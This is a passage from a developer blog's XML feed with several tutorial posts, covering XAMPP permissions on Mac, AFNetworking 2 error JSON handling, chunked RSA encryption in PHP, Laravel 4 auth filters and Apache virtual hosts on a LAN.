</span><span class="language-bash">sudo <span class="built_in">chown</span> -R root xampp <span class="comment"># change the owner of `xampp` directory</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chgrp</span> -R wheel xampp <span class="comment"># change the group of `xampp` directory</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chmod</span> 755 xampp/xampp <span class="comment"># change the permission of `xampp` file to -rwxr-xr-x</span></span></span><br></pre></td></tr></table></figure><p>Done :)</p><p><em>References:</em></p><ul><li><a href="http://www.kharysharpe.com/2011/04/automatically-starting-xampp-on-mac-osx-boot-up/">Automatically starting XAMPP on MAC OSX boot up</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve been using &lt;a href=&quot;http://www.mamp.info/&quot;&gt;MAMP&lt;/a&gt; for some time, unfortunately, it seems like outdated &lt;em&gt;(seldom update)&lt;/em&gt;,</summary>
        
      
    
    
    
    
    <category term="mac" scheme="http://jslim.net/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>AFNetworking 2 - get JSON on error</title>
    <link href="http://jslim.net/blog/2014/01/12/afnetworking-2-get-json-on-error/"/>
    <id>http://jslim.net/blog/2014/01/12/afnetworking-2-get-json-on-error/</id>
    <published>2014-01-12T05:07:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve just switched from <strong>AFNetworking 1.x</strong> to <strong>2.x</strong>.</p><p>In <strong>AFNetworking 1.x</strong>, I make a request using <code>JSONRequestOperationWithRequest</code> method. i.e.</p><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSURL</span> *url = [<span class="built_in">NSURL</span> URLWithString:<span class="string">@&quot;/login&quot;</span> relativeToURL:<span class="string">@&quot;http://api.example.com&quot;</span>];</span><br><span class="line">AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:url];</span><br><span class="line">[httpClient setParameterEncoding:AFFormURLParameterEncoding];</span><br><span class="line"><span class="built_in">NSURLRequest</span> *request = [httpClient requestWithMethod:<span class="string">@&quot;POST&quot;</span></span><br><span class="line">                                                 path:<span class="string">@&quot;login&quot;</span></span><br><span class="line">                                           parameters:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:</span><br><span class="line">                                                       <span class="string">@&quot;value1&quot;</span>, <span class="string">@&quot;key1&quot;</span>,</span><br><span class="line">                                                       <span class="string">@&quot;value2&quot;</span>, <span class="string">@&quot;key2&quot;</span>,</span><br><span class="line">                                                       <span class="literal">nil</span>]];</span><br><span class="line"></span><br><span class="line">[[AFJSONRequestOperation JSONRequestOperationWithRequest:request success:^(<span class="built_in">NSURLRequest</span> *request, <span class="built_in">NSHTTPURLResponse</span> *response, <span class="type">id</span> json) &#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;success %@&quot;</span>, json);</span><br><span class="line">&#125; failure:^(<span class="built_in">NSURLRequest</span> *request, <span class="built_in">NSHTTPURLResponse</span> *response, <span class="built_in">NSError</span> *error, <span class="type">id</span> json) &#123;</span><br><span class="line">    <span class="comment">// get the json easily</span></span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;failure %@&quot;</span>, json);</span><br><span class="line">&#125;] start];</span><br></pre></td></tr></table></figure><p>The method above I can get the <strong>json</strong> <em>(error message return from server)</em> on failure.</p><p>However, in <strong>AFNetworking 2.x</strong>, I dig for quite some time only found the solution.</p><h3 id="Create-a-subclass-of-AFJSONResponseSerializer"><a href="#Create-a-subclass-of-AFJSONResponseSerializer" class="headerlink" title="Create a subclass of AFJSONResponseSerializer"></a>Create a subclass of <code>AFJSONResponseSerializer</code></h3><p><strong>JSONResponseSerializerWithData.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;AFURLResponseSerialization.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// NSError userInfo key that will contain response data</span></span><br><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> * <span class="keyword">const</span> JSONResponseSerializerWithDataKey = <span class="string">@&quot;JSONResponseSerializerWithDataKey&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">JSONResponseSerializerWithData</span> : <span class="title">AFJSONResponseSerializer</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>JSONResponseSerializerWithData.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;JSONResponseSerializerWithData.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">JSONResponseSerializerWithData</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- (<span class="type">id</span>)responseObjectForResponse:(<span class="built_in">NSURLResponse</span> *)response</span><br><span class="line">                           data:(<span class="built_in">NSData</span> *)data</span><br><span class="line">                          error:(<span class="built_in">NSError</span> *__autoreleasing *)error</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (![<span class="keyword">self</span> validateResponse:(<span class="built_in">NSHTTPURLResponse</span> *)response data:data error:error]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*error != <span class="literal">nil</span>) &#123;</span><br><span class="line">            <span class="built_in">NSMutableDictionary</span> *userInfo = [(*error).userInfo mutableCopy];</span><br><span class="line">            <span class="built_in">NSError</span> *jsonError;</span><br><span class="line">            <span class="comment">// parse to json</span></span><br><span class="line">            <span class="type">id</span> json = [<span class="built_in">NSJSONSerialization</span> JSONObjectWithData:data options:<span class="built_in">NSJSONReadingAllowFragments</span> error:&amp;jsonError];</span><br><span class="line">            <span class="comment">// store the value in userInfo if JSON has no error</span></span><br><span class="line">            <span class="keyword">if</span> (jsonError == <span class="literal">nil</span>) userInfo[JSONResponseSerializerWithDataKey] = json;</span><br><span class="line">            <span class="built_in">NSError</span> *newError = [<span class="built_in">NSError</span> errorWithDomain:(*error).domain code:(*error).code userInfo:userInfo];</span><br><span class="line">            (*error) = newError;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">nil</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ([<span class="variable language_">super</span> responseObjectForResponse:response data:data error:error]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">AFHTTPRequestOperationManager *manager = [AFHTTPRequestOperationManager manager];</span><br><span class="line"><span class="comment">// LOOK AT THIS LINE, change to the serializer you&#x27;ve just created</span></span><br><span class="line">manager.responseSerializer = [JSONResponseSerializerWithData serializer];</span><br><span class="line">[manager POST:<span class="string">@&quot;http://api.example.com/login&quot;</span> parameters:@&#123;<span class="string">@&quot;key1&quot;</span>: <span class="string">@&quot;value1&quot;</span>, <span class="string">@&quot;key2&quot;</span>: <span class="string">@&quot;value2&quot;</span>&#125; success:^(AFHTTPRequestOperation *operation, <span class="type">id</span> responseObject) &#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;success %@&quot;</span>, responseObject);</span><br><span class="line">&#125; failure:^(AFHTTPRequestOperation *operation, <span class="built_in">NSError</span> *error) &#123;</span><br><span class="line">    <span class="comment">// get the json here</span></span><br><span class="line">    <span class="type">id</span> json = error.userInfo[JSONResponseSerializerWithDataKey];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;failure %@&quot;</span>, json);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/19325235/afnetworking-500-response-body/19383500#19383500">AFNetworking 500 response body</a></em></li><li><em><a href="https://github.com/AFNetworking/AFNetworking/issues/1397#issuecomment-26139898">HTTPClient -&gt; AFHTTPSessionManager | Response body on error?</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve just switched from &lt;strong&gt;AFNetworking 1.x&lt;/strong&gt; to &lt;strong&gt;2.x&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;AFNetworking 1.x&lt;/strong&gt;, I make a</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>RSA encryption &amp;amp; decryption on PHP</title>
    <link href="http://jslim.net/blog/2014/01/08/rsa-encryption-and-decryption-on-php/"/>
    <id>http://jslim.net/blog/2014/01/08/rsa-encryption-and-decryption-on-php/</id>
    <published>2014-01-08T22:59:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve come across RSA encryption on a very long string.</p><p>The solution is divide the long string into chunks according to the length of the key.</p><h2 id="Generate-key-pair"><a href="#Generate-key-pair" class="headerlink" title="Generate key pair"></a>Generate key pair</h2><p>Example here shows 512 bits of encryption</p><p>Generate private key</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>openssl genrsa -<span class="keyword">out</span> private_key.pem <span class="number">512</span></span><br></pre></td></tr></table></figure><p>Generate public key from private key</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>openssl rsa -in private_key.pem -pubout -<span class="keyword">out</span> public_key.pem</span><br></pre></td></tr></table></figure><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$plain_text</span> = <span class="string">&#x27;Text you want to encrypt. e.g. Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// read the public key</span></span><br><span class="line"><span class="variable">$public_key</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;public_key.pem&#x27;</span>));</span><br><span class="line"><span class="variable">$public_key_details</span> = <span class="title function_ invoke__">openssl_pkey_get_details</span>(<span class="variable">$public_key</span>);</span><br><span class="line"><span class="comment">// there are 11 bytes overhead for PKCS1 padding</span></span><br><span class="line"><span class="variable">$encrypt_chunk_size</span> = <span class="title function_ invoke__">ceil</span>(<span class="variable">$public_key_details</span>[<span class="string">&#x27;bits&#x27;</span>] / <span class="number">8</span>) - <span class="number">11</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// loop through the long plain text, and divide by chunks</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$plain_text</span>) &#123;</span><br><span class="line">    <span class="variable">$chunk</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$plain_text</span>, <span class="number">0</span>, <span class="variable">$encrypt_chunk_size</span>);</span><br><span class="line">    <span class="variable">$plain_text</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$plain_text</span>, <span class="variable">$encrypt_chunk_size</span>);</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$chunk</span>, <span class="variable">$encrypted</span>, <span class="variable">$public_key</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Failed to encrypt data&#x27;</span>);</span><br><span class="line">    <span class="variable">$output</span> .= <span class="variable">$encrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">openssl_free_key</span>(<span class="variable">$public_key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$output</span>);</span><br></pre></td></tr></table></figure><h2 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cipher_text</span> = <span class="string">&#x27;RZMrhPib29rq1ghwS+F2/oooG0tYW1p8MVKMkyNHQWkH/GyCJY74dbcO4DB/brB9W3UzNW63NV0N9Vqw3z+eCQi13eZBAKMBJ+2Y2YVh1UhGcG22orb5v0rRmLN3DpUz0wDyr5eFGXoyT+x9RgctMr2fVhFnMu5pXMLPgkC1LU4tBcU+LBdbn+1wq9CbxjtcRckmOeFbMwrX/vUrVbcwlxEIddgrEfr9xyONwE0XW4DEyHxNvv2bsP9c2SSwJm4nA/3HiEWqzPQzV1ygUWw+xd/GE7+QfCWeet8BQXAYbCVfmDaElHMb08M98g6hZC9w0GE2Qo7sw/JfOJm/xuR1Ths2mQPVwhGj+Z4feWxMi9o5LcZupyfpITuVd2C8uzjBWRjcqIZP1iXuj5etFKVgKFnnvN5fVxax3vBgwJ/AeZQdlvxy1BCEdvevSnDugEiThlXFB9uHA6126cD6F6OTDmknajb2U9BqkFqWfD+s44VIaQcrq8BLs7ZYWW9gtw1qNLBB7bVZL7w2u5pbSY7LugRERCJvS4bVh6xawnzUi5AHs+9x2LUMJWIe5zwdjGO2qBdgXpTDko+vFUVhzr15XBnKNb1TyXzIaHMwsgoXK8jnFuJu0I8ql+TlbLs0JlxML9Nlu//K11kaSV8mEEN/fp5lUmpVbB4MYRlYLFwkHvk3SJYoShK7im5HTmm4qZ8W40+PkFlMz7H/Jikm3wMuQh/QSwpBkqMo9xBG9L9spIz1M3r0auzV1Wrqvz0Q8b28&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decode the text to bytes</span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cipher_text</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// read the private key</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">openssl_pkey_get_private</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;private_key.pem&#x27;</span>));</span><br><span class="line"><span class="variable">$private_key_details</span> = <span class="title function_ invoke__">openssl_pkey_get_details</span>(<span class="variable">$private_key</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// there is no need to minus the overhead</span></span><br><span class="line"><span class="variable">$decrypt_chunk_size</span> = <span class="title function_ invoke__">ceil</span>(<span class="variable">$private_key_details</span>[<span class="string">&#x27;bits&#x27;</span>] / <span class="number">8</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decrypt it back chunk-by-chunk</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$encrypted</span>) &#123;</span><br><span class="line">    <span class="variable">$chunk</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$encrypted</span>, <span class="number">0</span>, <span class="variable">$decrypt_chunk_size</span>);</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$encrypted</span>, <span class="variable">$decrypt_chunk_size</span>);</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">openssl_private_decrypt</span>(<span class="variable">$chunk</span>, <span class="variable">$decrypted</span>, <span class="variable">$private_key</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Failed to decrypt data&#x27;</span>);</span><br><span class="line">    <span class="variable">$output</span> .= <span class="variable">$decrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">openssl_free_key</span>(<span class="variable">$private_key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br></pre></td></tr></table></figure><p>You can download the <a href="/attachments/posts/2014-01-09-rsa-encryption-and-decryption-on-php/rsa.php">example here</a>.</p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/5244129/openssl-use-rsa-private-key-to-generate-public-key/5246045#5246045">openssl use RSA private key to generate public key?</a></em></li><li><em><a href="http://3stepsbeyond.co.uk/2010/12/openssl-and-php-tutorial-part-two/">OpenSSL and PHP Tutorial – Part Two</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve come across RSA encryption on a very long string.&lt;/p&gt;
&lt;p&gt;The solution is divide the long string into chunks according to the length</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>PHP Laravel 4 - before &amp;amp; after action</title>
    <link href="http://jslim.net/blog/2013/12/20/php-laravel-4-before-and-after-action/"/>
    <id>http://jslim.net/blog/2013/12/20/php-laravel-4-before-and-after-action/</id>
    <published>2013-12-20T01:07:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>We may need to perform some actions before the controller function get called.</p><p>For example</p><h2 id="Check-user-authentication-before-access-to-certain-page"><a href="#Check-user-authentication-before-access-to-certain-page" class="headerlink" title="Check user authentication before access to certain page."></a>Check user authentication before access to certain page.</h2><p><strong>AccountController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AccountController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// before goes into certain function, check for authentication</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">beforeFilter</span>(<span class="string">&#x27;auth&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The filter function is in</p><p><strong>app/filters.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;auth&#x27;</span>, function()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Auth</span>::<span class="title function_ invoke__">guest</span>()) <span class="keyword">return</span> <span class="title class_">Redirect</span>::<span class="title function_ invoke__">to</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://laravel.com/docs/controllers#controller-filters">Laravel 4 - Controller Filters</a></em></li><li><em><a href="http://stackoverflow.com/questions/16317784/laravel-4-controller-before-and-after-function/16317851#16317851">Laravel 4 Controller Before and After function</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;We may need to perform some actions before the controller function get called.&lt;/p&gt;
&lt;p&gt;For example&lt;/p&gt;
&lt;h2</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
  </entry>
  
  <entry>
    <title>Apache Virtual Host accessed by other machines in LAN</title>
    <link href="http://jslim.net/blog/2013/12/14/apache-virtual-host-accessed-by-other-machines-in-lan/"/>
    <id>http://jslim.net/blog/2013/12/14/apache-virtual-host-accessed-by-other-machines-in-lan/</id>
    <published>2013-12-14T12:29:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>This is tested on Ubuntu 13.04 that running on VMWare Fusion 5. Host machine is MacBookPro that running Mavericks.</p><p>Most of the time in our development, we have to work on different projects.</p><p>We have to setup virtual host for every project.</p><h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>In this case is we have 2 projects that used the same port number. <strong>foo</strong> project &amp; <strong>bar</strong> project.</p><p>Later a software tester will need to test the project on his own machine.</p><p><code>Machine A</code> has the IP <strong>192.168.1.12</strong>. <code>Machine B</code> has the IP <strong>192.168.1.13</strong>.</p><h3 id="In-Machine-A-server-machine-that-hosts-all-projects"><a href="#In-Machine-A-server-machine-that-hosts-all-projects" class="headerlink" title="In Machine A (server machine that hosts all projects)"></a>In <code>Machine A</code> (server machine that hosts all projects)</h3><p>i.e. Add files to <code>/etc/apache2/sites-available/</code></p><p><strong>foo.com</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> webmaster@localhost</span><br><span class="line">    <span class="attribute">ServerName</span> local.foo.com</span><br><span class="line">    <span class="attribute">ServerAlias</span> local.foo.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> /home/user/public_html/foo</span><br><span class="line">    <span class="attribute">SetEnv</span> APPLICATION_ENV <span class="string">&quot;development&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;Directory <span class="string">&quot;/home/user/public_html/foo/&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">DirectoryIndex</span> index.php</span><br><span class="line">        <span class="attribute">Options</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line">        <span class="attribute">allow</span> from <span class="literal">all</span></span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line"></span><br><span class="line">    <span class="attribute">LogLevel</span> warn</span><br><span class="line"></span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>and</p><p><strong>bar.com</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> webmaster@localhost</span><br><span class="line">    <span class="attribute">ServerName</span> local.bar.com</span><br><span class="line">    <span class="attribute">ServerAlias</span> local.bar.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> /home/user/public_html/bar</span><br><span class="line">    <span class="attribute">SetEnv</span> APPLICATION_ENV <span class="string">&quot;development&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;Directory <span class="string">&quot;/home/user/public_html/bar/&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">DirectoryIndex</span> index.php</span><br><span class="line">        <span class="attribute">Options</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line">        <span class="attribute">allow</span> from <span class="literal">all</span></span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line"></span><br><span class="line">    <span class="attribute">LogLevel</span> warn</span><br><span class="line"></span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>Activate the virtual host</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo a2ensite foo.com</span><br><span class="line"><span class="variable">$ </span>sudo a2ensite bar.com</span><br><span class="line"><span class="comment"># Reload apache service</span></span><br><span class="line"><span class="variable">$ </span>sudo service apache2 reload</span><br></pre></td></tr></table></figure><p>Edit the hosts file <code>/etc/hosts</code>, add the following lines</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 local.foo.com</span><br><span class="line">127.0.0.1 local.bar.com</span><br></pre></td></tr></table></figure><h3 id="In-Machine-B-client-that-want-to-test-the-projects"><a href="#In-Machine-B-client-that-want-to-test-the-projects" class="headerlink" title="In Machine B (client that want to test the projects)"></a>In <code>Machine B</code> (client that want to test the projects)</h3><p>Edit the hosts file <code>/etc/hosts</code>, add the following lines</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.12 local.foo.com</span><br><span 